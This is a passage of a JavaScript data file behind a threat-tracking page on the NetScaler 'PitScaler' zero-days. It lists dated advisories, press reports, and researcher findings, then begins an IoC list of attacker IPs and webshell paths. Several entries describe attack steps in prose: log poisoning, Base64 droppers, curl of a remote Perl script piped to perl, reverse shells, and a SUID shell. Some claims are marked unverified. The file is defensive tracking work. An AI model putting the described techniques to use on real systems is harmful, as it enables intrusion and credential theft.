    body: 'Beaumont says his patched 13.1 and 14.1 honeypots are crashing, from multiple source IPs, and posts greps for authentication-daemon (nsaaad) crashes and pitboss restart messages in ns.log, one of them for 213.209.159.55. The two screenshots in the post show a write-up (author not named) about two 14.1-73.37 appliances that rebooted repeatedly after nsaaad crashed with exit status 0x8a and hit the restart limit of six. On one of them, crafted usernames on SAML factors told the appliance to fetch a payload from 213.209.159.55 over plain HTTP on port 443, save it as /v and run it, just before each crash. The write-up says this shows exploitation attempts and correlated crashes, not confirmed command execution, a CVE or a firmware regression, and adds *.pyrlnk.cc as a later delivery source. This is unverified: at the time there was no CVE and no vendor or CERT statement.', cite: ['kb12'],
    validated: 'Post text and both screenshots read directly on 2 Oct.' },
  { date: '2026-10-02', time: null, kind: 'official', title: 'Citrix publishes guidance on a new SAML issue, independent of CTX697096',
    body: 'Citrix says it is tracking a newly observed, configuration-dependent issue in customer-managed NetScaler deployments that use SAML authentication on a Gateway or AAA virtual server. An appliance is affected when its configuration contains add authentication samlAction or add authentication samlIdPProfile. Citrix says the issue is independent of CTX697096, plans a new security bulletin and product update, asks customers who see impact to contact Citrix Support, and asks all customers to upgrade once the bulletin is out. The post lists no CVE, affected versions or fixed builds yet. Beaumont links the post at 20:00 UTC.', cite: ['citrixsaml', 'kb13'] },
  { date: '2026-09-28', time: null, kind: 'official', title: 'CERT-FR, CSSF (Luxembourg) and CERT Quebec issue alerts',
    body: 'CERT-FR says the two vulnerabilities allow unauthenticated remote code execution, are actively exploited and were exploited before patches existed. The CSSF points supervised financial entities to the CIRCL report and reminds them that unauthenticated remote code execution is unauthorised access, so it counts as a major ICT-related incident to notify under DORA or its national circulars. CERT Quebec rates the risk critical (TLP:CLEAR) and says Quebec public bodies using a vulnerable product must test and deploy the vendor updates or mitigations.', cite: ['certfr', 'cssf', 'certqc'] },
  { date: '2026-09-30', time: null, kind: 'official', title: 'CERT-FR updates its alert with GTIG indicators',
    body: 'The update relays the GTIG/Mandiant indicators and YARA rules, which ANSSI says it has not qualified, and the two patterns GTIG calls characteristic of successful exploitation: a DTLS handshake-failure line in syslog, and a pitboss NOT restarting NSPPE line in /var/log/messages. CERT-FR also says it knows of public proof-of-concept code for CVE-2026-88771 (noted 28 Sep) and for CVE-2026-88772.', cite: ['certfr'] },
  { date: '2026-10-01', time: null, kind: 'official', title: 'BSI (Germany) updates its warning and recommends this site\'s IoC list',
    body: 'BSI\'s TLP:CLEAR warning BITS-H 2026-289305-1132 (version 1.1, 1 Oct) rates the criticality 3 / Orange, meaning act immediately. It says logs should be checked back to at least early September, that patching alone does not remove a compromise, and that operators should check for a compromise even if they patched on release day. In its update it links to PitScaler as a place that collects detection options and IoCs from several sources, and recommends that operators use the growing IoC list.', cite: ['bsi'] },
  { date: '2026-09-30', time: null, kind: 'official', title: 'NCSC-NL revises its advisory to version 1.0.1',
    body: 'The revision (30 Sep) extends the recommended actions with information on the Console scan script and IoCs, and says customers without Console should ask Citrix Support for the generic IoCs. The advisory says installing the update prevents new abuse but does not rule out earlier abuse, advises securing relevant logging and a memory dump before updating, and says appliances that were internet-facing before the update should be treated as possibly compromised.', cite: ['ncscnl'] },
  { date: '2026-09-30', time: null, kind: 'research', title: 'TENEX traces a Platypus C2 chain from the injected login',
    body: 'From malicious login requests TENEX followed four rotating staging hosts to a shell loader that enrols the off-the-shelf Platypus agent from entretiensol.com, then mapped a four-node C2 cluster through one shared TLS certificate. It also recovered the Python (customsnmpd reverse shell) and Perl (sec_monitor, .local_journal webshell, SUID /bin/sh, config theft) stages, and saw a separate loud wave of commodity payloads after the public PoC. TENEX does not name an actor and says logs show attempts, not confirmed execution.', cite: ['tenex'] },
  { date: '2026-10-01', time: '15:22', kind: 'research', title: 'Poppelgaard checker v1.9 adds public indicators',
    body: 'Release 1.9 of the free, read-only CTX697096 checker script adds, among others, Arctic Wolf\'s nsmon.pl implant, the Unit 42 .deb webshell and more attacker IPs, and tags each attack line as before or after the fix. Its author says a clean result is not proof of a clean appliance.', cite: ['poppchecker'] },
  { date: '2026-09-30', time: null, kind: 'official', title: 'Citrix updates its community bulletin',
    body: 'Last updated 30 Sep. It adds: a known issue where 13.1-64.23 can enter a reboot loop during upgrade if show ns variable lists variables (use 13.1-64.24); a Console Security Advisory scan that may wrongly flag 13.1-64.23 as vulnerable until the next automatic advisory update; a note that NetScaler VPX 15.1 Technology Preview is also vulnerable, is not permitted in production, and a fix will follow; and that samlRejectUnsignedAssertion OFF is no longer supported and is converted to the secure default on upgrade. For suspected compromise Citrix recommends deploying a new, updated instance rather than relying on the update, forwarding logs to an external SIEM, and using Console File Integrity Monitoring.', cite: ['citrixblog'] },
  { date: '2026-08-21', time: null, kind: 'research', title: 'Unit 42: earliest activity is NetScaler version fingerprinting',
    body: 'On 21 Aug 104.248.244.66 and then 77.83.199.39 requested /admin_ui/common/css/ns/ui.css and /vpn/js/rdx/core/lang/rdx_en.json.gz from a US NetScaler Gateway. On 21 and 22 Aug these two hosts and 78.47.24.217 sent the same requests to more than 100 other systems. Unit 42 describes this as fingerprinting, not exploitation.', cite: ['unit42'] },
  { date: '2026-09-04', time: null, kind: 'research', title: 'Unit 42: .deb webshell requests begin (CVE-2026-88772 chain)',
    body: 'From 4 to 24 Sep the actor repeatedly requested .deb files in /vpn/scripts/linux/, rotating infrastructure: one VPS per day on 4-8 Sep, Cloudflare WARP addresses on 9-11 Sep, 162.33.178.9 on 14 Sep and 193.149.176.207 daily on 15-24 Sep. A continuous stream of requests to /logon/LogonPoint/Authentication/GetUserName ran from 10 Sep until 01:54 UTC on 27 Sep, hours before the bulletin.', cite: ['unit42'] },
  { date: '2026-09-21', time: null, kind: 'research', title: 'Unit 42: three-stage CVE-2026-88771 chain drops a PHP webshell',
    body: '77.83.199.39, 78.47.24.217 and 139.180.152.138 staged a Base64 dropper in the User-Agent (logged to httpaccess-vpn.log), poisoned ns.log with a fake pitboss heartbeat message, and had ns_monuploadd_err.pl -WR decode and run it, installing the .ctxs.receiver webshell at a US target.', cite: ['unit42'] },
  { date: '2026-09-29', time: '00:59', kind: 'research', title: 'Sygnia: new "unexpectedly died" log-poison variant',
    body: 'Sygnia saw commands after pitboss PPE unexpectedly died NSPPE; in raw logs: copying ns.conf to /var/netscaler/logon/insight-new.js (00:59 UTC), curl of update_c08937.pl from 64.94.85.67 piped to perl (03:18 UTC) and whoami (04:05-04:07 UTC). Sygnia notes this shows the commands reached the vulnerable logging path, not that they ran.', cite: ['sygnia'] },
  { date: '2026-09-30', time: null, kind: 'research', title: 'Arctic Wolf publishes follow-up exploitation IoCs and the nsmon.pl implant',
    body: 'Commands fetched Python, Perl and shell scripts, opened reverse shells and sent Base64 command output over HTTP. The 3,752-byte Perl script nsmon.pl installs under /var/tmp/.nsmon, attempts to add a root cron entry every five minutes, attempts to listen on a port in 41000-41999 and begins a UDP or TCP check-in. These are attempts in the visible code, not proven persistence. Arctic Wolf also shows the injected username as it appears in AAA, AAATM and SSLVPN appliance logs.', cite: ['arcticwolf'] },
  { date: '2026-09-30', time: null, kind: 'research', title: 'Sygnia publishes an IR-based advisory',
    body: 'Investigation-derived indicators (IPs, .sig artefacts, a JSON artefact and a SHA-256) that Sygnia stresses are context-specific and not Citrix-published; validate NAT and direction before blocking.', cite: ['sygnia'] },
  { date: '2026-09-30', time: '22:00', kind: 'research', title: 'Unit 42 expands its threat brief',
    body: 'Adds pre- and post-disclosure activity back to 21 Aug, analysis of the nsg64.deb RC4 webshell and the .ctxs.receiver webshell, hunting queries and a formal IoC list. Updated 15:00 PT.', cite: ['unit42'] },
  { date: '2026-10-01', time: null, kind: 'official', title: 'Citrix ships version 4 of its IoC detection logic',
    body: 'Citrix has released a fourth version of the IoC detection logic used by the NetScaler Console scan. Citrix\'s documentation says the logic keeps being updated and that Console shows when an update is available, so rerun the scan after updating.', cite: ['ncdocs'], validated: 'Version 4 validated independently on 1 Oct.' },
  { date: '2026-10-01', time: '00:12', kind: 'reported', title: 'Beaumont: Arctic Wolf set is new "spray and pray" activity',
    body: 'He says the follow-up activity covered by the Arctic Wolf IoCs is definitely not related to the initial actor in early September.', cite: ['kb11'] },
  { date: '2026-09-10', time: '07:14', kind: 'official', title: 'CVE IDs reserved',
    body: 'NetScaler reserves CVE-2026-88771 and CVE-2026-88772 at 07:14 UTC. The records were published on 27 Sep at 16:02 and 16:09 UTC.', cite: ['cverec', 'gnchron'],
    validated: 'Validated against the CVE record on 29 Sep.' },
  { date: '2026-09-05', time: null, kind: 'research', title: 'eSentire: CVE-2026-88771 exploited as early as 5 September',
    body: 'eSentire TRU incident response saw exploitation of Internet-facing NetScaler Gateways from 5 Sep, more than three weeks before disclosure: base64 PHP staged in the access log via fake /vpn/media/*.ico requests, then executed through a crafted login username. In one intrusion a .deb-variant webshell was installed and operated from 5 Sep, with signs of data exfiltration and lateral movement to internal virtual desktops and back to the appliance over SSH.', cite: ['esentire'] },
  { date: '2026-09-23', time: null, kind: 'reported', title: 'Danish NetScalers start going offline',
    body: 'Ingeniøren\'s review of Shodan data shows several Danish NetScaler systems switched off from 23 Sep, four days before Citrix\'s public disclosure.', cite: ['ingdk'] },
  { date: '2026-09-25', time: null, kind: 'reported', title: 'Danish government agencies shut down their NetScalers',
    body: 'Danish agencies, among them PET, the Armed Forces and the police, took their Citrix NetScaler environments offline from Friday 25 Sep, two days before Citrix disclosed the vulnerabilities. Ingeniøren later reported the shutdowns from Shodan data; none of the agencies would explain why.', cite: ['ingdk'],
    validated: 'The Friday 25 Sep shutdown was validated independently on 30 Sep.' },
  { date: '2026-09-24', time: '07:32', kind: 'telemetry', title: 'GreyNoise sensors see exploitation from a single IP',
    body: '149.104.78.141: 3 sessions 07:32:19-07:32:20 UTC. IP flagged "suspicious" (Citrix ADC Gateway Login Panel Crawler), then "malicious" (Generic ' + IFS + ' Use in RCE Attempt; CitrixBleed 2 attempt). Later retro-tagged as CVE-2026-88771. GreyNoise\'s retro-hunt found no other exploitation sessions before disclosure - this covers GreyNoise sensors only.', cite: ['gnblog', 'gnchron', 'gnip'] },
  { date: '2026-09-25', time: null, kind: 'official', title: 'NCSC-NL confidentially warns Dutch organisations',
    body: 'On the afternoon of Friday 25 Sep, after a tip from a European partner, NCSC-NL confidentially informed companies and organisations, including central government, about two NetScaler zero-days being exploited outside the Netherlands, before any patch existed. Dark Reading reports that a copy of the pre-notification, marked TLP:AMBER+STRICT, was briefly posted on Reddit and then deleted. According to BleepingComputer, the notice said Citrix found the vulnerabilities while investigating incidents at customers and filed a notification under the EU Cyber Resilience Act.', cite: ['nlgov', 'darkreading', 'bleeping'] },
  { date: '2026-09-26', time: '06:43', kind: 'reported', title: 'r/Citrix "Netscaler leak?" thread',
    body: 'User FastFredNL opens the thread at 06:43:22 UTC (08:43 CEST), reporting that an IT provider advised shutting NetScalers down immediately. It becomes the first public gathering point, with admins reporting similar unofficial advice over the weekend. Dark Reading dates the first reports to 25 Sep, but the thread itself was posted on 26 Sep.', cite: ['reddit', 'ifin', 'darkreading', 'nlgov'],
    validated: 'Post timestamp checked on the thread itself (30 Sep). The shutdown advice is consistent with the Dutch government letter to parliament.' },
  { date: '2026-09-26', time: '23:39', kind: 'reported', title: 'IFIN opens a public tracking thread',
    body: 'IFIN starts compiling public reporting and observables for the NetScaler zero-days; it later states that all observables it shares were shared without restriction.', cite: ['ifin'] },
  { date: '2026-09-26', time: '22:19', kind: 'research', title: 'watchTowr: two unpatched RCE zero-days, found during forensics',
    quote: 'Two vulnerabilities - both RCE. Unpatched, 0days. Exploited in-the-wild - discovered during forensics.',
    body: 'watchTowr adds that Citrix comms and patches are expected early the following week.', cite: ['watchtowrx'] },
  { date: '2026-09-26', time: null, kind: 'reported', title: 'watchTowr: pull NetScaler appliances offline immediately',
    body: 'watchTowr publicly warns that credible rumours of unpatched NetScaler RCEs are circulating; later that day CEO Benjamin Harris says the rumours are confirmed and urges admins to pull NetScaler appliances offline immediately.', quote: 'Please, take this seriously and pull NetScaler appliances offline immediately.', cite: ['darkreading'] },
  { date: '2026-09-27', time: null, kind: 'official', title: 'Danish Defence Intelligence (FE) and CERT-EU warn NetScaler users',
    body: 'The Danish Defence Intelligence Service sent a warning urging NetScaler users to update, per Ingeniøren. CERT-EU published Security Advisory 2026-014 recommending an immediate update of all customer-managed appliances and enabling Enhanced ISN Generation where TCP is configured.', cite: ['ingdk', 'certeuadv'] },
  { date: '2026-09-27', time: '10:05', kind: 'reported', title: 'Dutch hospitals Amphia and ETZ close patient portals',
    body: 'Patients of Amphia (Breda) and Elisabeth-TweeSteden Ziekenhuis (Tilburg) cannot log in to their portals; other Dutch hospitals report problems too. That evening Z-CERT, the Dutch healthcare CERT, says it warned the sector about critical vulnerabilities in Citrix NetScaler and advised temporarily switching the system off.', cite: ['omroepbrabant'] },
  { date: '2026-09-27', time: '15:51', kind: 'official', title: 'Public disclosure; Citrix publishes CTX697096 with fixes',
    body: 'Disclosure time per GreyNoise. The bulletin covers 8 CVEs. watchTowr notes the patch it analysed was dated 24 Sep, suggesting Citrix knew of the exploitation the week before.', cite: ['citrix', 'gnchron', 'darkreading'] },
  { date: '2026-09-27', time: '16:06', kind: 'official', title: 'Citrix announces the bulletin on r/Citrix',
    body: 'A Citrix staff account (CTX-Michael) posts a CRITICAL UPDATE in r/Citrix linking the CTX697096 bulletin and the Citrix community blog post with its IoC section, and quoting that exploitation of CVE-2026-88771 and CVE-2026-88772 on unmitigated deployments has been observed.', cite: ['citrixreddit', 'citrixblog'] },
  { date: '2026-09-27', time: '20:28', kind: 'telemetry', title: 'GreyNoise deploys CVE-specific tag',
    body: 'Tag deployed 20:28:39 UTC; the 24 Sep sessions are retro-tagged as CVE-2026-88771.', cite: ['gnchron', 'gntag'] },
  { date: '2026-09-27', time: '21:30', kind: 'official', title: 'CISA adds CVE-2026-88771 and CVE-2026-88772 to KEV',
    body: 'Both were added on 27 Sep with a federal remediation deadline of 30 Sep. The 21:30 UTC release time comes from the compiled dataset and was not found in the sources checked.', cite: ['cisa', 'kev'],
    validated: 'Dates validated against the KEV catalog feed on 29 Sep.' },
  { date: '2026-09-27', time: '23:15', kind: 'telemetry', title: 'Unit 42: 50,277 exposed instances',
    body: 'Palo Alto Networks Cortex Xpanse identifies 50,277 exposed NetScaler instances that could potentially be vulnerable (update posted 4:15 p.m. PT). Exposure, not confirmed compromise.', cite: ['unit42'] },
  { date: '2026-09-27', time: null, kind: 'reported', title: 'Beaumont: three CVEs chained, webshells all September',
    quote: 'The primary vulns being exploited are CVE-2026-88771, CVE-2026-88772, CVE-2026-88773 chained. It gives unauth RCE in default appliance config. Attackers using it to drop webshells all month of September. Probably nation state aligned',
    body: 'Beaumont\'s claim; attribution not independently verified.', cite: ['kb1'] },
  { date: '2026-09-27', time: null, kind: 'reported', title: 'Beaumont: patches live, detection script behind NDA',
    body: 'Patches are live on the main support site; Citrix\'s detection script is locked behind NDA/support.', quote: 'patching alone doesn\'t remove the backdoors being placed', cite: ['kb2'] },
  { date: '2026-09-27', time: null, kind: 'reported', title: 'Beaumont: Console check misses earlier attempts',
    body: 'The NetScaler Console check misses earlier semi-successful attempts because it relies on logs not having rotated; he adds that the activity is weeks old because of slow disclosure.', cite: ['kb3'],
    validated: 'Validated independently on 29 Sep.' },
  { date: '2026-09-28', time: null, kind: 'reported', title: 'Press covers the weekend shutdown warnings',
    body: 'BleepingComputer, SecurityWeek, The Record and CyberScoop cover the story.', cite: ['bleeping', 'secweek', 'record', 'cyberscoop'] },
  { date: '2026-09-28', time: null, kind: 'research', title: 'CERT-EU technical writeup on CVE-2026-88771',
    body: '"Taking \'execute logging\' a bit too literally" - root cause, attack chain and hunting guidance.', cite: ['certeu'] },
  { date: '2026-09-28', time: null, kind: 'official', title: 'Government advisories worldwide',
    body: 'NCSC-NL NCSC-2026-0394 [H/H], NCSC-UK, CSA Singapore AL-2026-129, plus Canada, HKCERT, ACSC, and CIRCL TR-100 with per-CVE config-check CLI commands.', cite: ['ncscnl', 'ncscuk', 'csasg', 'cccs', 'hkcert', 'acsc', 'circl'] },
  { date: '2026-09-28', time: null, kind: 'telemetry', title: 'GreyNoise publishes TLP:CLEAR IoC set',
    body: '"Swarming Against Citrix 0-Day Exploitation" - the first public IoC set in this compiled dataset as of 29 Sep, with a companion Chronicle timeline.', cite: ['gnblog', 'gnchron'] },
  { date: '2026-09-28', time: null, kind: 'research', title: 'watchTowr Labs part 1 (CVE-2026-88771)',
    body: '"Oh Look, the Foot Gun Went Off Again", published with a Detection Artefact Generator (PoC-class tool).', cite: ['wt1', 'wt1tool'] },
  { date: '2026-09-28', time: null, kind: 'telemetry', title: 'Censys and Shadowserver count exposed NetScalers',
    body: 'Censys detects NetScaler ADC or Gateway on 42,735 hosts and 323,527 web properties; these are exposed instances, not confirmed-vulnerable counts. Shadowserver reports more than 20,000 instances exposed and potentially at risk.', cite: ['censys', 'cydive'] },
  { date: '2026-09-28', time: null, kind: 'telemetry', title: 'Lupovis honeypots see exploitation minutes after the public PoC',
    body: 'Lupovis says its sensors recorded live CVE-2026-88771 exploitation attempts within minutes of watchTowr releasing its PoC; the attempts were opportunistic, from several distinct actors.', cite: ['helpnet', 'beazley'] },
  { date: '2026-09-28', time: null, kind: 'research', title: 'First public detection rules',
    body: 'Elastic merges a rule for NetScaler log-poisoning command injection; Corelight publishes Zeek hunting queries. Sigma and Nuclei pull requests follow (28-29 Sep, still unmerged at snapshot time).', cite: ['elastic', 'corelight', 'sigma', 'nuclei'] },
  { date: '2026-09-28', time: null, kind: 'research', title: 'Truesec publishes potential C2 IPs',
    body: 'Truesec lists 104.248.244.66, 139.180.152.138 and 77.83.199.39 as potential C2 IPs it has observed.', cite: ['truesec'] },
  { date: '2026-09-28', time: '22:49', kind: 'reported', title: 'Beaumont names it "PitScaler"',
    quote: 'I\'m tracking over 100 victim orgs now. Each one has a unique webshell which can\'t be scanned for remotely unless you\'re the attacker. It\'s espionage.',
    body: 'Victim count is Beaumont\'s claim, not independently verified.', cite: ['kb4'] },
  { date: '2026-09-28', time: '23:02', kind: 'reported', title: 'Beaumont: Citrix checker incomplete',
    body: 'The checker does not check for suid on /bin/sh; Beaumont calls on NCSCs to publish a detection script.', quote: 'Some really big orgs are backdoored after patching still', cite: ['kb5'],
    validated: 'The missing suid /bin/sh check was validated independently on 29 Sep. The claim about big organisations still being backdoored is not independently verified.' },
  { date: '2026-09-29', time: '04:39', kind: 'reported', title: 'Beaumont: mass exploitation',
    quote: '#PitScaler is under mass exploitation, seeing it spray and pray now. I\'ve done some firmware version scanning, fewer than 10% of boxes are patched',
    body: 'The <10% figure is Beaumont\'s own estimate, not independently verified.', cite: ['kb6'] },
  { date: '2026-09-29', time: '06:18', kind: 'reported', unverified: true, unverifiedLabel: 'Compromise unverified', title: 'Beaumont posts a public message to the NSA',
    quote: 'do forensics on 103.41.70.207,vdicorp.nsa.gov',
    body: 'The domain resolves to that IP. That the host is an NSA-operated Citrix system has been validated independently. That it is compromised is Beaumont\'s implication and is not verified. This briefing does not identify any organisation as compromised, and these values are not listed as IoCs.', cite: ['kb7'] },
  { date: '2026-09-29', time: null, kind: 'research', title: 'watchTowr Labs part 2 (CVE-2026-88772)',
    body: '"Here We Go Again" (Sina Kheirkhah) - full RCE analysis plus a second Detection Artefact Generator.', cite: ['wt2', 'wt2tool'] },
  { date: '2026-09-29', time: null, kind: 'research', title: 'Google GTIG / Mandiant: custom malware WHIPSHOT and SLAPSHOT',
    body: 'The CVE-2026-88772 campaign has been ongoing since at least early September. WHIPSHOT is a PHP webshell staged with a .deb disguise that hides base64 C2 in HTTP headers; SLAPSHOT is a Python TCP tunneler (open/push/pull/exch/close/ping) used to reach internal networks for reconnaissance and credential theft.', cite: ['gtig', 'register'] },
  { date: '2026-09-29', time: null, kind: 'reported', title: 'BleepingComputer: credential theft and internal spread',
    body: 'It reports that attackers exploited CVE-2026-88772 to deploy webshells and tunneling malware, gain root, steal credentials and spread into internal networks, citing Mandiant. GTIG itself describes the credential theft and internal reconnaissance in at least one observed intrusion.', cite: ['bleeping2', 'gtig'] },
  { date: '2026-09-29', time: '18:49', kind: 'reported', title: 'The Register: government, banks and professional services targeted',
    body: 'It reports GTIG/Mandiant findings that government, financial services, education and legal and professional services organisations in North America and Europe were likely hit. watchTowr CEO Benjamin Harris criticises the slow disclosure and says no attribution has been made public.',
    quote: 'Why Citrix took so long to disclose these vulnerabilities is a question only Citrix can answer', cite: ['register', 'gtig'] },
  { date: '2026-09-29', time: null, kind: 'reported', title: 'Mandiant CTO: check for compromise before patching',
    quote: 'Given the active exploitation, NetScaler customers should prioritize examining their systems for compromise *before* upgrading/patching',
    body: 'Charles Carmakal on LinkedIn, as quoted by The Register.', cite: ['register'],
    validated: 'Quote validated against a second, non-public source on 29 Sep.' },
  { date: '2026-09-29', time: null, kind: 'research', title: 'Nextron releases THOR rules and a NetScaler filesystem IoC set',
    body: 'Three rules in the THOR Preview channel (higher false-positive rate than stable rules) plus a YAML IoC set derived from the filesystem checks in Citrix\'s scanner script. A match is a lead, not proof.', cite: ['nextron'] },
  { date: '2026-09-29', time: null, kind: 'research', title: 'eSentire publishes first-hand IR findings and IoCs',
    body: 'Two webshell variants (.ico and .deb), 14 IPs and 2 SHA-256 hashes; the technique matches CERT-EU\'s description. eSentire advises treating appliances that were Internet-facing and unpatched in early September as potentially compromised until an integrity assessment shows otherwise.', cite: ['esentire'] },
  { date: '2026-09-29', time: null, kind: 'telemetry', title: 'Defused: hundreds of decoy hits across multiple exploit paths',
    body: 'Defused reports hundreds of CVE-2026-88771 hits on its decoys in 24 hours via /nf/auth/doAuthentication.do, /cgi/login, /p/u/doLogon.do, /logon/LogonPoint/tmindex.html and User-Agent payloads on /. Observed follow-up: whoami/id to prove root, nx_verify.html marker files, curl/wget/fetch pulling a second stage, and blind DNS callbacks. Full IoCs are on Defused Radar (not reproduced here).', cite: ['defused'] },
  { date: '2026-09-29', time: '16:12', kind: 'reported', title: 'Beaumont: IR writeups expose victim-unique indicators',
    body: 'IR vendors are publishing PitScaler writeups containing victim-unique webshell names (.sig files) and attacker IPs, which he says lets him map victim orgs via network traffic. He warns that unremediated orgs\' published webshell names can be used to access their boxes, and says one vendor uploaded its IR investigation to VirusTotal.', cite: ['kb8'],
    validated: 'Validated independently on 29 Sep.' },
  { date: '2026-09-28', time: '09:40', kind: 'official', title: 'NHS England alert CC-4858',
    body: 'NHS England\'s National CSOC rates the threat High and assesses further exploitation as almost certain. It strongly recommends a compromise assessment before patching, since patching first may delete evidence, and warns that end-of-life 12.1 and 13.0 releases are likely vulnerable and receive no fix. Published 10:40 UK time.', cite: ['nhs'] },
  { date: '2026-09-28', time: null, kind: 'official', title: 'ACSC alert; Australian organisations later confirm exploitation',
    body: 'Australia\'s ACSC publishes an alert on 28 Sep. In an update it says Australian organisations have since confirmed exploitation, and recommends reviewing for evidence of compromise since at least 4 Sep 2026. The original background text, still lower on the page, says no Australian exploitation had been confirmed at first publication.', cite: ['acsc'], validated: 'Both statements checked on the ACSC page on 1 Oct.' },
  { date: '2026-09-28', time: null, kind: 'reported', title: 'Dutch ministry and hospitals take systems offline',
    body: 'The Dutch Ministry of the Interior took all Citrix environments offline over the weekend; patients of two major hospitals (Amphia and ETZ) could not view their records, and Frisius MC in Leeuwarden shut down some digital systems as a precaution (SDxCentral, citing Techzine).', cite: ['sdx'] },
  { date: '2026-09-29', time: null, kind: 'official', title: 'DKCERT warns Danish universities and research institutions',
    body: 'DKCERT, the CERT for the Danish research and education network, reports two critical NetScaler zero-days exploited before a patch and notes that several administrators took systems offline before Citrix published details.', cite: ['dkcert'] },
  { date: '2026-09-29', time: null, kind: 'reported', title: 'Mandiant: dozens of organisations impacted',
    body: 'Cybersecurity Dive reports Mandiant CTO Charles Carmakal saying the actor deployed webshells and moved laterally into internal networks at some targets, with dozens of organisations impacted across North America and Europe, including telecommunications.', cite: ['cydive2'] },
  { date: '2026-09-30', time: null, kind: 'reported', title: 'Mandiant CTO: suspected state-sponsored actors likely behind the first intrusions',
    body: 'Help Net Security relays Carmakal saying advanced and suspected state-sponsored threat actors are likely behind the initial targeted intrusions that used CVE-2026-88772, with dozens of organisations impacted across North America and Europe. No actor is named.', cite: ['helpnet930'] },
  { date: '2026-09-29', time: null, kind: 'official', title: 'Dutch government confirms preventive disconnection',
    body: 'Letter to parliament: on Saturday 26 Sep the CIO Rijk set the line "loskoppelen tenzij" (disconnect unless) for central government, and it was broadly applied; remote-work access has not yet been restored everywhere while the patch is tested and forensic investigation continues. Beaumont relays it at 18:32 UTC as "shut down all Citrix Netscalers".', cite: ['nlgov', 'kb10'] },
  { date: '2026-09-30', time: '05:00', kind: 'reported', title: 'Ingeniøren: PET, Danish Defence and police shut down Citrix',
    body: 'Based on Shodan data, Ingeniøren reports that PET, the Danish Armed Forces, the Danish police and Copenhagen Airport, among many others, had to switch off their Citrix environments over the weekend. None of the agencies would explain why.', cite: ['ingdk'] },
  { date: '2026-09-30', time: null, kind: 'official', deadline: true, title: 'Deadline: CISA KEV federal remediation',
    body: 'Both CVEs were added to KEV on 27 Sep with a due date of 30 Sep, giving US federal agencies three days. The required action is to apply Citrix mitigations under BOD 26-04 and CISA\'s Forensics Triage Requirements, or stop using the product if mitigations are unavailable; the KEV notes say customers must conduct forensic triage. CISA gives a date, not a time, so in US time it had only just passed at this snapshot. A deadline, not an event.', cite: ['kev', 'cisa', 'qualys', 'bccisa'] }
];

/* ---------- IoCs: ONLY the GreyNoise TLP:CLEAR set, verbatim ---------- */
var GN_CAVEAT = 'Observed in GreyNoise sensor data; not a universal indicator for every victim.';
var IR_CAVEAT = 'IR-vendor observation. Beaumont reports attacker IPs in IR writeups can be unique to one victim; absence is not proof of a clean host.';
var GTIG_CAVEAT = 'Published by GTIG/Mandiant as a hunting lead. GTIG keeps its full IoC collection for registered GTI users only.';
var GTIG_SHARE = 'Public blog, no TLP marking';
var LUP_CAVEAT = 'Lupovis honeypot observation (its own post on X, plus press and Beazley). Mostly opportunistic activity after the public PoC.';
var LUP_SHARE = 'Public article, no TLP marking';
var DEF_CAVEAT = 'Hunting lead from Defused decoys, not an IoC. These are legitimate NetScaler endpoints; flag requests only when a logged field carries shell metacharacters or a payload.';
var DEF_SHARE = 'Public post, no TLP marking';
var ES_CAVEAT = 'eSentire TRU incident-response observation. Payload hosts and exploitation sources change; not a universal indicator for every victim.';
var ES_SHARE = 'Public advisory, no TLP marking';
var BSL_CAVEAT = 'Hunting lead compiled by Beazley Security Labs; not proof of compromise on its own.';
var BSL_SHARE = 'Public advisory, no TLP marking';
var GN_SCAN_CAVEAT = 'Opportunistic scanning or exploitation attempt seen by GreyNoise sensors after the public PoC; most of these IPs also carry crawler and CitrixBleed 2 tags. A hunting lead, not proof of targeting.';
var WARP_CAVEAT = 'Cloudflare WARP egress address, shared by very many ordinary Cloudflare WARP / 1.1.1.1 users. Never block it and never import it into an IoC feed; use it only to correlate timing within your own logs.';
var GN_SCAN_SHARE = 'GreyNoise Visualizer tag search, viewed Sep 29';
var IFIN_CAVEAT = 'Compiled by IFIN from shared reports; the original reporter of each value is not stated.';
var AW_CAVEAT = 'Arctic Wolf observation; a subset, not exhaustive. Beaumont says this follow-up activity is unrelated to the early-September actor.';
var AW_SHARE = 'Public GitHub repository, no TLP marking';
var U42_CAVEAT = 'Unit 42 incident observation. The actor rotated infrastructure, so values may be specific to the victims Unit 42 saw.';
var U42_SHARE = 'Public blog, no TLP marking';
var SYG_CAVEAT = 'Sygnia investigation-derived, context-specific indicator, not Citrix-published. Validate ownership, NAT and direction before blocking.';
var SYG_SHARE = 'Public advisory, no TLP marking';
var LB_CAVEAT = 'LevelBlue THOR hunt finding across its own customer environments; not independently confirmed. Use as a hunting pivot, not a blocklist.';
var LB_SHARE = 'Public blog, no TLP marking';
var LB_NOTE = ' LevelBlue also lists it from its own THOR hunt, not independently confirmed.';
var TEN_CAVEAT = 'TENEX incident observation, recovered from the operator\'s own servers. Appliance telemetry showed the injection reaching the handler, not that commands ran. The operator rebuilds, so hashes are short-lived.';
var TEN_SHARE = 'Public blog, no TLP marking';
var TEN_OPP_CAVEAT = 'TENEX opportunistic wave after the public PoC; unattributed commodity tooling, not tied to the Platypus operator.';
var RD_CAVEAT = 'Single Reddit commenter, unverified. The wt88771 prefix with a random suffix looks like a detection canary, but it does not appear in watchTowr\'s published tool or write-up, so do not attribute it to watchTowr. Treat as a hunting lead.';
var RD_SHARE = 'Public Reddit comment';
var IOCS = [
  { type: 'IPv4', value: '149.104.78.141', context: 'Exploitation source, Sep 24 (3 sessions 07:32:19-07:32:20 UTC). GreyNoise Visualizer on Sep 29: AS154177 LIGHT NODE LIMITED, Japan; not observed mass scanning in the past day.', caveat: GN_CAVEAT + ' Beaumont reports attacker IPs vary per victim. eSentire also lists it as an exploitation source.', cite: ['gnblog', 'gnip', 'esentire'], share: 'TLP:CLEAR' },
  { type: 'File path', value: '/var/netscaler/logon/LogonPoint/custom/.ctxs.receiver', context: 'Webshell path on disk', caveat: GN_CAVEAT + ' Beaumont reports webshell names are unique per victim.', cite: ['gnblog', 'unit42', 'sygnia'], share: 'TLP:CLEAR' },
  { type: 'URL alias', value: 'receiver.min.css', context: 'Webshell alias', caveat: GN_CAVEAT, cite: ['gnblog'], share: 'TLP:CLEAR' },
  { type: 'AliasMatch regex', value: 'receiver\\.min\\.[0-9a-f]+\\.css', context: 'Apache config (httpd.conf) AliasMatch', caveat: GN_CAVEAT + ' Pattern as published; also check httpd.conf integrity generally.', cite: ['gnblog', 'certeu'], share: 'TLP:CLEAR' },
